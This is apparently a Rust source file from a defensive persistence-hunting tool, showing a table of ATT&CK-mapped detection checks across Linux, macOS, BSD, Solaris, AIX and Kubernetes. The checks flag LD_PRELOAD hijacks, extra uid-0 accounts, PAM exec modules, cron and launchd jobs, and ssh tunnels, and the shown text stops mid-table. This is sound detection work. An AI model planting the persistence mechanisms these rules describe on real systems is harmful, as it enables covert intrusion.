//! The persistence checks of `persistence-hunter`: plain functions in one static table, each
//! mapped to an ATT&CK technique. A check looks at one parsed record and returns the reason
//! when it matches. This is not a plugin system and not a rule language.

use clap::ValueEnum;
use serde::Serialize;
use serde_json::Value;
use Severity::{High, Low, Medium};

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Serialize, ValueEnum)]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Info,
    Low,
    Medium,
    High,
}

pub struct Check {
    pub id: &'static str,
    pub artifact: &'static str,
    pub technique: &'static str,
    pub tactic: &'static str,
    pub severity: Severity,
    pub title: &'static str,
    /// The reason (detail text) when the record matches.
    pub test: fn(&Value) -> Option<String>,
}

const fn chk(
    id: &'static str,
    artifact: &'static str,
    technique: &'static str,
    tactic: &'static str,
    severity: Severity,
    title: &'static str,
    test: fn(&Value) -> Option<String>,
) -> Check {
    Check { id, artifact, technique, tactic, severity, title, test }
}

const PERSIST: &str = "Persistence";
const C2: &str = "Command and Control";

/// One row per (check, artifact). A check that needs a different technique for a different kind
/// of record (launchd agents and daemons, cron scripts and init scripts) appears twice.
pub static CHECKS: &[Check] = &[
    chk("cron-suspicious-command", "cron", "T1053.003", PERSIST, High, "Cron job runs a suspicious command", |r| {
        susp(r, "command")
    }),
    chk("cron-reboot-job", "cron", "T1053.003", PERSIST, Low, "Cron job runs at every boot", |r| {
        (text(r, "schedule") == "@reboot").then(|| format!("@reboot: {}", text(r, "command")))
    }),
    chk(
        "cron-script-writable",
        "cron-scripts",
        "T1053.003",
        PERSIST,
        Medium,
        "Cron script is writable or not owned by root",
        script_writable,
    ),
    chk(
        "cron-script-writable",
        "init-d",
        "T1037.004",
        PERSIST,
        Medium,
        "Init script is writable or not owned by root",
        script_writable,
    ),
    chk("at-job", "at-jobs", "T1053.002", PERSIST, Low, "Queued at job", |r| {
        Some(format!("at job: {}", text(r, "command")))
    }),
    chk("at-job-suspicious", "at-jobs", "T1053.002", PERSIST, High, "At job runs a suspicious command", |r| {
        susp(r, "command")
    }),
    chk(
        "anacron-suspicious-command",
        "anacron",
        "T1053.003",
        PERSIST,
        High,
        "Anacron job runs a suspicious command",
        |r| susp(r, "command"),
    ),
    chk(
        "systemd-suspicious-exec",
        "systemd-units",
        "T1543.002",
        PERSIST,
        High,
        "systemd unit runs a suspicious command",
        systemd_exec,
    ),
    chk(
        "systemd-user-unit",
        "systemd-units",
        "T1543.002",
        PERSIST,
        Low,
        "systemd unit in a user's home directory",
        |r| {
            let path = text(r, "source_path");
            ["home/", "root/", "Users/"].iter().any(|p| path.starts_with(p)).then(|| format!("unit file {path}"))
        },
    ),
    chk("rc-local-command", "rc-local", "T1037.004", PERSIST, Low, "rc.local runs a command at boot", |r| {
        let line = text(r, "text").trim();
        // `touch /var/lock/subsys/local` is the one line the RHEL family ships in rc.local.
        (line != "exit 0" && line != "touch /var/lock/subsys/local").then(|| line.to_string())
    }),
    chk("rc-local-suspicious", "rc-local", "T1037.004", PERSIST, High, "rc.local runs a suspicious command", |r| {
        susp(r, "text")
    }),
    chk(
        "shell-profile-suspicious",
        "shell-profiles",
        "T1546.004",
        PERSIST,
        Medium,
        "Shell startup file with suspicious content",
        shell_profile,
    ),
    chk("ld-preload-entry", "ld-preload", "T1574.006", PERSIST, High, "Library listed in ld.so.preload", |r| {
        (text(r, "kind") == "preload").then(|| format!("preloads {}", text(r, "path")))
    }),
    chk(
        "ld-library-path-writable",
        "ld-preload",
        "T1574.006",
        PERSIST,
        High,
        "Linker search path in a temporary directory",
        |r| {
            let path = text(r, "path");
            (text(r, "kind") == "library_path" && starts_with_temp(path)).then(|| format!("search path {path}"))
        },
    ),
    chk("systemd-ld-preload", "systemd-units", "T1574.006", PERSIST, High, "systemd unit sets LD_PRELOAD", |r| {
        let environment = text(r, "environment");
        environment.contains("LD_PRELOAD=").then(|| format!("Environment={environment}"))
    }),
    chk(
        "authorized-key-forced-command",
        "authorized-keys",
        "T1098.004",
        PERSIST,
        Medium,
        "authorized_keys entry with a forced command",
        |r| r["forced_command"].as_str().map(|c| format!("forced command: {c}")),
    ),
    chk("authorized-key-root", "authorized-keys", "T1098.004", PERSIST, Low, "SSH key authorized for root", |r| {
        (text(r, "user") == "root").then(|| format!("key {} ({})", text(r, "fingerprint"), text(r, "comment")))
    }),
    chk("udev-run-suspicious", "udev-rules", "T1546.017", PERSIST, High, "udev rule runs a suspicious command", |r| {
        susp(r, "command")
    }),
    chk(
        "modprobe-install-command",
        "modules-load",
        "T1547.006",
        PERSIST,
        Medium,
        "modprobe install directive runs a command",
        modprobe_install,
    ),
    chk("pam-exec-module", "pam", "T1556.003", "Credential Access", Medium, "PAM stack runs pam_exec", |r| {
        (text(r, "module_type") != "@include"
            && text(r, "module").ends_with("pam_exec.so")
            && !stock_pam_exec(text(r, "arguments")))
        .then(|| format!("{}: pam_exec.so {}", text(r, "service"), text(r, "arguments")))
    }),
    chk(
        "pam-module-unusual-path",
        "pam",
        "T1556.003",
        "Credential Access",
        High,
        "PAM module loaded from an unusual path",
        |r| {
            let module = text(r, "module");
            let usual = ["/lib/", "/lib64/", "/usr/lib/", "/usr/lib64/", "/usr/lib32/", "/lib32/"];
            (module.starts_with('/') && !usual.iter().any(|p| module.starts_with(p)))
                .then(|| format!("{}: {module}", text(r, "service")))
        },
    ),
    chk(
        "xdg-autostart-suspicious",
        "xdg-autostart",
        "T1547.013",
        PERSIST,
        High,
        "Autostart entry runs a suspicious command",
        |r| susp(r, "exec"),
    ),
    chk("passwd-extra-uid0", "passwd", "T1136.001", PERSIST, High, "Account other than root with uid 0", |r| {
        // `toor` is the stock BSD alternate root account: no password, this exact comment.
        let stock_toor = text(r, "user") == "toor"
            && text(r, "password_field") == "*"
            && text(r, "gecos") == "Bourne-again Superuser";
        (r["uid"].as_u64() == Some(0) && text(r, "user") != "root" && !stock_toor)
            .then(|| format!("{} has uid 0", text(r, "user")))
    }),
    chk(
        "passwd-password-in-passwd",
        "passwd",
        "T1078.003",
        PERSIST,
        Medium,
        "Password field set in /etc/passwd",
        |r| {
            let field = text(r, "password_field");
            (!["x", "*", "!"].contains(&field)).then(|| format!("{}: password field is not x", text(r, "user")))
        },
    ),
    chk("shadow-passwordless", "shadow", "T1078.003", PERSIST, High, "Account has an empty password", |r| {
        (r["passwordless"] == true).then(|| format!("{} can log in without a password", text(r, "user")))
    }),
    chk(
        "sudoers-nopasswd-all",
        "sudoers",
        "T1548.003",
        "Privilege Escalation",
        Medium,
        "sudo rule allows every command without a password",
        |r| {
            let all = text(r, "commands").split(',').any(|c| c.trim() == "ALL");
            let default_account = r["joined"]["default_account"].is_string();
            (text(r, "kind") == "rule" && r["nopasswd"] == true && all && !default_account)
                .then(|| text(r, "text").to_string())
        },
    ),
    chk(
        "systemd-timer-suspicious-service",
        "systemd-units",
        "T1053.006",
        PERSIST,
        High,
        "systemd timer starts a service that runs a suspicious command",
        |r| activated_exec(r, "timer"),
    ),
    chk(
        "systemd-trigger-suspicious-service",
        "systemd-units",
        "T1543.002",
        PERSIST,
        High,
        "systemd socket or path unit starts a service that runs a suspicious command",
        |r| activated_exec(r, "socket").or_else(|| activated_exec(r, "path")),
    ),
    chk(
        "systemd-enablement-outside-unit-dirs",
        "systemd-enablement",
        "T1543.002",
        PERSIST,
        Medium,
        "Enabled or linked unit file lives outside the unit directories",
        enablement_outside_unit_dirs,
    ),
    chk("systemd-linger", "systemd-enablement", "T1543.002", PERSIST, Low, "User services run without a login", |r| {
        (text(r, "kind") == "linger").then(|| format!("lingering enabled for {}", text(r, "owner")))
    }),
    chk(
        "systemd-generator-in-etc",
        "systemd-generators",
        "T1543.002",
        PERSIST,
        Medium,
        "systemd generator installed under /etc",
        |r| Some(format!("{} (mode {}, uid {})", text(r, "source_path"), text(r, "mode"), r["uid"])),
    ),
    chk(
        "motd-script-suspicious",
        "motd-scripts",
        "T1037",
        PERSIST,
        High,
        "Message-of-the-day script runs a suspicious command",
        |r| susp(r, "text"),
    ),
    chk(
        "nm-dispatcher-suspicious",
        "nm-dispatcher",
        "T1546",
        PERSIST,
        High,
        "NetworkManager dispatcher script runs a suspicious command",
        |r| susp(r, "text"),
    ),
    chk(
        "logrotate-script-suspicious",
        "logrotate-scripts",
        "T1053",
        PERSIST,
        High,
        "logrotate script runs a suspicious command",
        |r| susp(r, "text").map(|d| format!("{} {d}", text(r, "section"))),
    ),
    chk(
        "environment-ld-preload",
        "shell-profiles",
        "T1574.006",
        PERSIST,
        High,
        "Session environment preloads or redirects libraries",
        |r| (text(r, "source_path") == "etc/environment").then(|| env_library_hijack(text(r, "text"))).flatten(),
    ),
    chk(
        "environment-ld-preload",
        "env-config",
        "T1574.006",
        PERSIST,
        High,
        "Session environment preloads or redirects libraries",
        |r| env_library_hijack(text(r, "text")),
    ),
    chk(
        "environment-path-hijack",
        "shell-profiles",
        "T1574.007",
        PERSIST,
        Medium,
        "Session PATH contains a temporary, hidden or relative directory",
        |r| (text(r, "source_path") == "etc/environment").then(|| env_path_hijack(text(r, "text"))).flatten(),
    ),
    chk(
        "environment-path-hijack",
        "env-config",
        "T1574.007",
        PERSIST,
        Medium,
        "Session PATH contains a temporary, hidden or relative directory",
        |r| env_path_hijack(text(r, "text")),
    ),
    chk(
        "sshd-authorized-keys-command",
        "sshd-config",
        "T1098.004",
        PERSIST,
        Medium,
        "sshd fetches authorized keys by running a command",
        |r| {
            // The two commands that systemd and SSSD ship, exactly as they ship them.
            let stock = ["/usr/bin/userdbctl ssh-authorized-keys %u", "/usr/bin/sss_ssh_authorizedkeys %u"];
            (text(r, "keyword") == "AuthorizedKeysCommand"
                && !["", "none"].contains(&text(r, "value"))
                && !stock.contains(&text(r, "value")))
            .then(|| format!("AuthorizedKeysCommand {}", text(r, "value")))
        },
    ),
    chk("sshd-force-command", "sshd-config", "T1098.004", PERSIST, Medium, "sshd forces a command on login", |r| {
        let value = text(r, "value");
        let sftp = value == "internal-sftp" || value.starts_with("internal-sftp ");
        (text(r, "keyword") == "ForceCommand" && !["", "none"].contains(&value) && !sftp).then(|| {
            let scope = text(r, "match_condition");
            format!(
                "ForceCommand {value}{}",
                if scope.is_empty() { String::new() } else { format!(" (Match {scope})") }
            )
        })
    }),
    chk("sshd-command-suspicious", "sshd-config", "T1098.004", PERSIST, High, "sshd runs a suspicious command", |r| {
        ["AuthorizedKeysCommand", "ForceCommand"]
            .contains(&text(r, "keyword"))
            .then(|| susp(r, "value").map(|d| format!("{} {d}", text(r, "keyword"))))
            .flatten()
    }),
    chk(
        "modules-load-unknown-module",
        "modules-load",
        "T1547.006",
        PERSIST,
        Medium,
        "Module loaded at boot is not in the collected kernel tree",
        |r| {
            (r["module_in_kernel_tree"] == false)
                .then(|| format!("loads {}, which is not under lib/modules", text(r, "module")))
        },
    ),
    chk(
        "ld-library-path-unusual",
        "ld-preload",
        "T1574.006",
        PERSIST,
        Low,
        "Linker search path outside the standard library directories",
        |r| {
            let path = text(r, "path");
            let usual = ["/lib", "/lib32", "/lib64", "/libx32", "/usr/lib", "/usr/lib32", "/usr/lib64", "/usr/libx32"];
            let local = path.strip_prefix("/usr/local/").is_some_and(|rest| rest == "lib" || rest.starts_with("lib"));
            let inside = |dir: &&str| path == *dir || path.strip_prefix(*dir).is_some_and(|rest| rest.starts_with('/'));
            (text(r, "kind") == "library_path" && !local && !usual.iter().any(inside))
                .then(|| format!("search path {path}"))
        },
    ),
    chk(
        "sudoers-default-account-nopasswd",
        "sudoers",
        "T1548.003",
        "Privilege Escalation",
        Low,
        "sudo rule gives the image's default account passwordless sudo",
        |r| {
            let account = r["joined"]["default_account"].as_str()?;
            Some(format!("{account} (uid 1000) may run every command without a password: {}", text(r, "text")))
        },
    ),
    chk(
        "launchd-suspicious-program",
        "launchd",
        "T1543.001",
        PERSIST,
        High,
        "LaunchAgent runs a suspicious command",
        |r| launchd_exec(r, "_agent"),
    ),
    chk(
        "launchd-suspicious-program",
        "launchd",
        "T1543.004",
        PERSIST,
        High,
        "LaunchDaemon runs a suspicious command",
        |r| launchd_exec(r, "_daemon"),
    ),
    chk(
        "launchd-apple-label-outside-system",
        "launchd",
        "T1036.004",
        "Defense Evasion",
        Medium,
        "com.apple. label outside System/Library",
        |r| {
            let (label, path) = (text(r, "label"), text(r, "source_path"));
            // A user agent that runs an Apple binary (the stock CSConfigDotMacCert agent) is not
            // pretending to be anything.
            let program = launchd_program(r);
            let apple_binary =
                text(r, "scope") == "user_agent" && ["/System/", "/usr/"].iter().any(|p| program.starts_with(p));
            (label.starts_with("com.apple.") && !path.starts_with("System/Library/") && !apple_binary)
                .then(|| format!("{label} in {path}"))
        },
    ),
    chk(
        "launchd-user-agent-persistent",
        "launchd",
        "T1543.001",
        PERSIST,
        Low,
        "User LaunchAgent starts a program from a user location",
        |r| {
            let program = launchd_program(r);
            let usual = ["/Applications/", "/System/", "/Library/", "/usr/"];
            let persistent = r["run_at_load"] == true || r["keep_alive"].as_str().is_some_and(|k| k != "false");
            (text(r, "scope") == "user_agent" && persistent && !usual.iter().any(|p| program.starts_with(p)))
                .then(|| program.to_string())
        },
    ),
    chk("launchd-dyld-insert", "launchd", "T1574.006", PERSIST, High, "launchd job sets DYLD_INSERT_LIBRARIES", |r| {
        let library = r["environment"]["DYLD_INSERT_LIBRARIES"].as_str()?;
        Some(format!("{} injects {library}", text(r, "label")))
    }),
    chk("emond-rule-command", "emond", "T1546.014", PERSIST, High, "Event Monitor rule runs a command", |r| {
        let command = text(r, "command");
        (!command.is_empty() && r["enabled"] != false).then(|| format!("{}: {command}", text(r, "rule")))
    }),
    chk("kext-third-party", "kernel-extensions", "T1547.006", PERSIST, Low, "Third-party kernel extension", |r| {
        Some(format!("{} ({})", text(r, "bundle_id"), text(r, "executable")))
    }),
    chk("btm-item-unsigned", "btm", "T1547.015", PERSIST, Low, "Background item without a signing identity", |r| {
        let path = text(r, "executable_path");
        let anonymous = text(r, "team_id").is_empty() && ["", "Unknown Developer"].contains(&text(r, "developer_name"));
        (anonymous && !path.is_empty() && !path.starts_with("/System/")).then(|| path.to_string())
    }), // Solaris and illumos (the functions are in `hunt_solaris.rs`).
    chk(
        "smf-start-method-suspicious",
        "smf-repository",
        "T1543",
        PERSIST,
        High,
        "SMF service starts a program from a temporary or hidden location",
        solaris::smf_start_method,
    ),
    chk(
        "smf-site-service-enabled",
        "smf-repository",
        "T1543",
        PERSIST,
        Low,
        "Enabled SMF service imported from a site manifest",
        solaris::smf_site_service,
    ),
    chk(
        "smf-manifest-suspicious-exec",
        "smf-manifests",
        "T1543",
        PERSIST,
        High,
        "SMF manifest runs a program from a temporary or hidden location",
        solaris::smf_manifest_exec,
    ),
    chk(
        "smf-manifest-site",
        "smf-manifests",
        "T1543",
        PERSIST,
        Low,
        "Locally added SMF manifest",
        solaris::smf_manifest_present,
    ),
    chk(
        "inittab-unusual-entry",
        "inittab",
        "T1037.004",
        PERSIST,
        Medium,
        "init entry that is not in the stock inittab",
        solaris::inittab_unusual,
    ),
    chk(
        "inittab-suspicious-command",
        "inittab",
        "T1037.004",
        PERSIST,
        High,
        "init entry runs a suspicious command",
        solaris::inittab_suspicious,
    ),
    chk(
        "rc-script-suspicious",
        "rc-scripts",
        "T1037.004",
        PERSIST,
        High,
        "Legacy rc script runs a suspicious command",
        solaris::rc_script_lines,
    ),
    chk(
        "rc-script-writable",
        "rc-scripts",
        "T1037.004",
        PERSIST,
        Medium,
        "Legacy rc script is writable or not owned by root",
        solaris::rc_script_writable,
    ),
    chk(
        "crle-path-outside-system",
        "crle-config",
        "T1574.006",
        PERSIST,
        Medium,
        "Runtime linker path outside the system directories",
        solaris::crle_path,
    ),
    chk(
        "crle-path-temporary",
        "crle-config",
        "T1574.006",
        PERSIST,
        High,
        "Runtime linker path in a temporary or hidden directory",
        solaris::crle_path_temp,
    ),
    chk(
        "crle-environment-setting",
        "crle-config",
        "T1574.006",
        PERSIST,
        High,
        "Runtime linker configuration sets environment variables",
        solaris::crle_environment,
    ),
    chk(
        "etc-system-forceload",
        "etc-system",
        "T1547.006",
        PERSIST,
        Medium,
        "Kernel module forced to load at boot",
        solaris::system_forceload,
    ),
    chk(
        "etc-system-moddir",
        "etc-system",
        "T1547.006",
        PERSIST,
        High,
        "Kernel module search path changed",
        solaris::system_moddir,
    ),
    chk(
        "kernel-drv-conf-without-module",
        "kernel-drv",
        "T1547.006",
        PERSIST,
        Medium,
        "Driver configuration file with no driver module",
        solaris::kernel_drv_no_module,
    ),
    chk(
        "user-attr-root-equivalent",
        "user-attr",
        "T1098",
        "Privilege Escalation",
        Medium,
        "Account holds a root-equivalent RBAC profile",
        solaris::user_attr_root_equivalent,
    ),
    chk(
        "rbac-exec-attr-root-outside-system",
        "rbac-profiles",
        "T1548",
        "Privilege Escalation",
        High,
        "RBAC profile runs a program as root from outside the system directories",
        solaris::rbac_exec_root,
    ),
    chk("at-job", "solaris-at-jobs", "T1053.002", PERSIST, Low, "Queued at job", solaris::at_job),
    chk(
        "at-job-suspicious",
        "solaris-at-jobs",
        "T1053.002",
        PERSIST,
        High,
        "At job runs a suspicious command",
        solaris::at_job_suspicious,
    ),
    chk(
        "shadow-passwordless",
        "solaris-shadow",
        "T1078.003",
        PERSIST,
        High,
        "Account has an empty password",
        solaris::shadow_passwordless,
    ),
    chk(
        "login-su-defaults",
        "default-files",
        "T1556",
        "Credential Access",
        High,
        "login or su defaults weakened",
        solaris::default_files,
    ),
    chk(
        "pam-module-unusual-path",
        "pam-conf",
        "T1556.003",
        "Credential Access",
        High,
        "PAM module loaded from an unusual path",
        solaris::pam_module_path,
    ),
    chk(
        "rhosts-wildcard",
        "rhosts",
        "T1021",
        PERSIST,
        High,
        "r-command trust file trusts every host or user",
        solaris::rhosts_wildcard,
    ),
    chk("rhosts-entry", "rhosts", "T1021", PERSIST, Low, "r-command trust entry", solaris::rhosts_entry),
    // Kubernetes nodes, remote-access tools and tunnels.
    chk(
        "k8s-static-pod-unexpected",
        "k8s-manifests",
        "T1053.007",
        PERSIST,
        Medium,
        "Static pod that is not a control-plane component",
        static_pod_unexpected,
    ),
    chk(
        "k8s-static-pod-host-access",
        "k8s-manifests",
        "T1610",
        PERSIST,
        High,
        "Static pod with host namespaces or privileges and the host root or a container socket mounted",
        static_pod_host_access,
    ),
    chk(
        "k3s-auto-apply-not-stock",
        "k8s-manifests",
        "T1053.007",
        PERSIST,
        Medium,
        "k3s applies a manifest that k3s does not ship",
        k3s_auto_apply_not_stock,
    ),
    chk(
        "kubelet-anonymous-auth",
        "kubelet-config",
        "T1556",
        "Defense Evasion",
        High,
        "kubelet accepts anonymous requests",
        |r| (r["anonymous_auth"] == true).then(|| "anonymous authentication is enabled".to_string()),
    ),
    chk(
        "kubelet-authorization-always-allow",
        "kubelet-config",
        "T1556",
        "Defense Evasion",
        High,
        "kubelet authorizes every authenticated request",
        |r| (text(r, "authorization_mode") == "AlwaysAllow").then(|| "authorization mode is AlwaysAllow".to_string()),
    ),
    chk(
        "remote-tool-autostart",
        "systemd-units",
        "T1219",
        C2,
        Low,
        "Remote-access or tunnel tool configured to start",
        |r| SYSTEMD_EXEC.iter().find_map(|f| remote_tool(text(r, f)).map(|t| format!("{t} ({f}){}", unit_state(r)))),
    ),
    chk("remote-tool-autostart", "cron", "T1219", C2, Low, "Remote-access or tunnel tool configured to start", |r| {
        remote_tool(text(r, "command")).map(|t| format!("{t}: {}", text(r, "command")))
    }),
    // FreeBSD, OpenBSD and NetBSD.
    chk("rc-local-command", "bsd-rc-local", "T1037.004", PERSIST, Low, "rc.local runs a command at boot", |r| {
        let line = text(r, "text").trim();
        (line != "exit 0").then(|| line.to_string())
    }),
    chk("rc-local-suspicious", "bsd-rc-local", "T1037.004", PERSIST, High, "rc.local runs a suspicious command", |r| {
        susp(r, "text")
    }),
    chk("at-job", "bsd-at-jobs", "T1053.002", PERSIST, Low, "Queued at job", |r| {
        Some(format!("at job: {}", text(r, "command")))
    }),
    chk("at-job-suspicious", "bsd-at-jobs", "T1053.002", PERSIST, High, "At job runs a suspicious command", |r| {
        susp(r, "command")
    }),
    chk(
        "rc-d-script-writable",
        "rc-d",
        "T1037.004",
        PERSIST,
        Medium,
        "rc.d script is writable or not owned by root",
        script_writable,
    ),
    chk("rc-d-suspicious-command", "rc-d", "T1037.004", PERSIST, High, "rc.d script runs a suspicious command", |r| {
        // The whole script body is searched too, but only for payload handling: base scripts
        // mention /tmp and hidden paths all the time.
        susp(r, "command").or_else(|| {
            let body = text(r, "commands");
            suspicious_command(body).filter(|why| !why.starts_with("runs from")).map(|why| format!("{why}: {body}"))
        })
    }),
    chk(
        "rc-conf-suspicious-service",
        "rc-conf",
        "T1037.004",
        PERSIST,
        High,
        "Service enabled in rc.conf starts a suspicious command",
        |r| susp(r, "command"),
    ),
    chk("loader-module-load", "loader-conf", "T1547.006", PERSIST, Low, "Kernel module loaded at boot", |r| {
        (text(r, "kind") == "module_load" && r["enabled"] == true)
            .then(|| format!("{} ({})", text(r, "module"), text(r, "variable")))
    }),
    chk(
        "ttys-nonstandard-command",
        "ttys",
        "T1037.004",
        PERSIST,
        Medium,
        "Terminal entry runs a program other than a getty",
        |r| {
            let command = text(r, "command");
            let program = command.split_whitespace().next().unwrap_or_default().rsplit('/').next().unwrap_or_default();
            let standard = ["getty", "xdm", "wdm", "gdm", "kdm", "sddm", "lightdm", "ttymsg", "ttyp"];
            (!command.is_empty() && command != "none" && !standard.contains(&program))
                .then(|| format!("{}: {command} ({})", text(r, "tty"), text(r, "status")))
        },
    ),
    chk(
        "ttys-suspicious-command",
        "ttys",
        "T1037.004",
        PERSIST,
        High,
        "Terminal entry runs a suspicious command",
        |r| susp(r, "command"),
    ),
    chk(
        "doas-permit-nopass",
        "doas-conf",
        "T1548.003",
        "Privilege Escalation",
        Medium,
        "doas rule allows every command without a password",
        |r| {
            (text(r, "action") == "permit" && r["nopass"] == true && text(r, "command").is_empty())
                .then(|| text(r, "text").to_string())
        },
    ),
    chk("devd-action-suspicious", "devd-conf", "T1546", PERSIST, High, "devd action runs a suspicious command", |r| {
        susp(r, "command")
    }),
    chk("jail-exec-suspicious", "jail-conf", "T1543", PERSIST, High, "Jail start or stop command is suspicious", |r| {
        susp(r, "command")
    }),
    chk(
        "master-passwd-extra-uid0",
        "master-passwd",
        "T1136.001",
        PERSIST,
        High,
        "Account other than root with uid 0",
        |r| {
            let user = text(r, "user");
            // `toor` is the stock BSD alternate root account; it ships with no password.
            let stock_toor =
                user == "toor" && text(r, "hash_type") == "none" && text(r, "gecos") == "Bourne-again Superuser";
            (r["uid"].as_u64() == Some(0) && user != "root" && !stock_toor).then(|| format!("{user} has uid 0"))
        },
    ),
    chk(
        "master-passwd-passwordless",
        "master-passwd",
        "T1078.003",
        PERSIST,
        High,
        "Account has an empty password",
        |r| (r["passwordless"] == true).then(|| format!("{} can log in without a password", text(r, "user"))),
    ),
    chk(
        "remote-tool-autostart",
        "anacron",
        "T1219",
        C2,
        Low,
        "Remote-access or tunnel tool configured to start",
        |r| remote_tool(text(r, "command")).map(|t| format!("{t}: {}", text(r, "command"))),
    ),
    chk(
        "remote-tool-autostart",
        "at-jobs",
        "T1219",
        C2,
        Low,
        "Remote-access or tunnel tool configured to start",
        |r| remote_tool(text(r, "command")).map(|t| format!("{t}: {}", text(r, "command"))),
    ),
    chk(
        "remote-tool-autostart",
        "rc-local",
        "T1219",
        C2,
        Low,
        "Remote-access or tunnel tool configured to start",
        |r| remote_tool(text(r, "text")).map(|t| format!("{t}: {}", text(r, "text"))),
    ),
    chk(
        "remote-tool-autostart",
        "xdg-autostart",
        "T1219",
        C2,
        Low,
        "Remote-access or tunnel tool configured to start",
        |r| remote_tool(text(r, "exec")).map(|t| format!("{t}: {}", text(r, "exec"))),
    ),
    chk(
        "ssh-tunnel-command",
        "systemd-units",
        "T1572",
        C2,
        Medium,
        "ssh forwarding or tunnel started from a unit",
        |r| {
            SYSTEMD_EXEC
                .iter()
                .find_map(|f| ssh_tunnel(text(r, f)).map(|t| format!("{f} {t}: {}{}", text(r, f), unit_state(r))))
        },
    ),
    chk("ssh-tunnel-command", "cron", "T1572", C2, Medium, "ssh forwarding or tunnel started from cron", |r| {
        ssh_tunnel(text(r, "command")).map(|t| format!("{t}: {}", text(r, "command")))
    }),
    chk("ssh-tunnel-command", "anacron", "T1572", C2, Medium, "ssh forwarding or tunnel started from anacron", |r| {
        ssh_tunnel(text(r, "command")).map(|t| format!("{t}: {}", text(r, "command")))
    }),
    chk("ssh-tunnel-command", "at-jobs", "T1572", C2, Medium, "ssh forwarding or tunnel started from an at job", |r| {
        ssh_tunnel(text(r, "command")).map(|t| format!("{t}: {}", text(r, "command")))
    }),
    chk("ssh-tunnel-command", "rc-local", "T1572", C2, Medium, "ssh forwarding or tunnel started from rc.local", |r| {
        ssh_tunnel(text(r, "text")).map(|t| format!("{t}: {}", text(r, "text")))
    }),
    chk(
        "remote-access-tool-present",
        "remote-access-config",
        "T1219",
        C2,
        Severity::Info,
        "Remote-access or tunnel tool is configured on this host",
        remote_tool_present,
    ),
    chk(
        "tunnel-exposes-local-service",
        "remote-access-config",
        "T1572",
        C2,
        Medium,
        "Tunnel or proxy exposes a local service",
        tunnel_exposes_service,
    ),
    chk(
        "vscode-tunnel-service-account",
        "remote-access-config",
        "T1219.001",
        C2,
        Medium,
        "VS Code tunnel state for root or a service account",
        vscode_tunnel_service_account,
    ),
    chk(
        "vpn-hook-suspicious",
        "remote-access-config",
        "T1546",
        PERSIST,
        High,
        "VPN configuration runs a suspicious command when the tunnel changes state",
        vpn_hook_suspicious,
    ),
    chk("login-hook", "login-window", "T1037.002", PERSIST, Medium, "Login or logout hook configured", |r| {
        matches!(text(r, "kind"), "login_hook" | "logout_hook")
            .then(|| format!("{}: {}", text(r, "name"), text(r, "value")))
    }),
    chk(
        "login-hook-suspicious",
        "login-window",
        "T1037.002",
        PERSIST,
        High,
        "Login or logout hook runs a suspicious command",
        |r| matches!(text(r, "kind"), "login_hook" | "logout_hook").then(|| susp(r, "value")).flatten(),
    ),
    chk(
        "relaunch-app-user-location",
        "login-window",
        "T1547.007",
        PERSIST,
        Low,
        "Application reopened at login runs from a user location",
        |r| {
            let path = text(r, "path");
            let usual = ["/Applications/", "/System/", "/Library/", "/usr/"];
            (text(r, "kind") == "relaunch_app" && !path.is_empty() && !usual.iter().any(|p| path.starts_with(p)))
                .then(|| format!("{} ({})", path, text(r, "bundle_id")))
        },
    ),
    chk(
        "auth-db-admin-rule-allow",
        "auth-db",
        "T1556",
        "Credential Access",
        High,
        "Authorization right system.privilege.admin set to allow",
        // Apple's default (Security framework `authorization.plist`) is class `user`, group
        // `admin`; class `allow` lets any process obtain the right without authenticating.
        |r| {
            (text(r, "name") == "system.privilege.admin" && text(r, "class") == "allow")
                .then(|| "system.privilege.admin has class allow (default: user, group admin)".to_string())
        },
    ),
    chk("startup-item", "startup-items", "T1037.005", PERSIST, Medium, "Legacy StartupItems entry", |r| {
        // StartupItems is deprecated since OS X 10.10; a default install has none outside System.
        let path = text(r, "source_path");
        (!path.starts_with("System/")).then(|| format!("{path} (interpreter {})", text(r, "interpreter")))
    }),
    chk("legacy-rc-command", "legacy-rc", "T1037.004", PERSIST, Medium, "Command in rc.local or launchd.conf", |r| {
        let (path, line) = (text(r, "source_path"), text(r, "text").trim());
        (!path.ends_with("rc.common") && !line.is_empty()).then(|| line.to_string())
    }),
    chk(
        "legacy-rc-suspicious",
        "legacy-rc",
        "T1037.004",
        PERSIST,
        High,
        "rc.local or launchd.conf runs a suspicious command",
        |r| (!text(r, "source_path").ends_with("rc.common")).then(|| susp(r, "text")).flatten(),
    ),
    chk(
        "folder-action-script",
        "folder-action-scripts",
        "T1546",
        PERSIST,
        Medium,
        "Folder Action script present",
        |r| Some(format!("{} (interpreter {})", text(r, "source_path"), text(r, "interpreter"))),
    ),
    chk(
        "authorization-plugin",
        "system-plugins",
        "T1556",
        "Credential Access",
        Medium,
        "Third-party authorization or Directory Services plug-in",
        |r| {
            // Apple's own plug-ins live under /System; these two folders hold third-party ones.
            let bundle_id = text(r, "bundle_id");
            (matches!(text(r, "kind"), "authorization_plugin" | "directory_services_plugin")
                && !bundle_id.starts_with("com.apple."))
            .then(|| format!("{} ({bundle_id})", text(r, "source_path")))
        },
    ),
    chk(
        "config-profile-root-certificate",
        "config-profiles",
        "T1553.004",
        "Defense Evasion",
        Medium,
        "Configuration profile installs a root certificate",
        |r| {
            r["payload_types"]
                .as_array()
                .is_some_and(|types| types.iter().any(|t| t == "com.apple.security.root"))
                .then(|| {
                    format!(
                        "profile {} ({}) carries a com.apple.security.root payload",
                        text(r, "name"),
                        text(r, "identifier")
                    )
                })
        },
    ),
    // ---- IBM AIX (artifacts `aix-*`; every format here is synthetic only, see docs/LIMITATIONS.md)
    chk(
        "aix-inittab-suspicious-command",
        "aix-inittab",
        "T1037.004",
        PERSIST,
        High,
        "inittab entry runs a suspicious command",
        |r| susp(r, "command").map(|why| format!("{} ({}): {why}", text(r, "id"), text(r, "action"))),
    ),
    chk(
        "aix-inittab-nonsystem-command",
        "aix-inittab",
        "T1037.004",
        PERSIST,
        Medium,
        "inittab entry runs a program outside the system directories",
        aix_inittab_nonsystem,
    ),
    chk("aix-at-job", "aix-at-jobs", "T1053.002", PERSIST, Low, "Queued at job", |r| {
        Some(format!("at job: {}", text(r, "command_tail")))
    }),
    chk("aix-at-job-suspicious", "aix-at-jobs", "T1053.002", PERSIST, High, "At job runs a suspicious command", |r| {
        susp(r, "command_tail")
    }),
    chk(
        "aix-rc-suspicious",
        "aix-rc-scripts",
        "T1037.004",
        PERSIST,
        High,
        "AIX boot script runs a suspicious command",
        |r| susp(r, "text"),
    ),
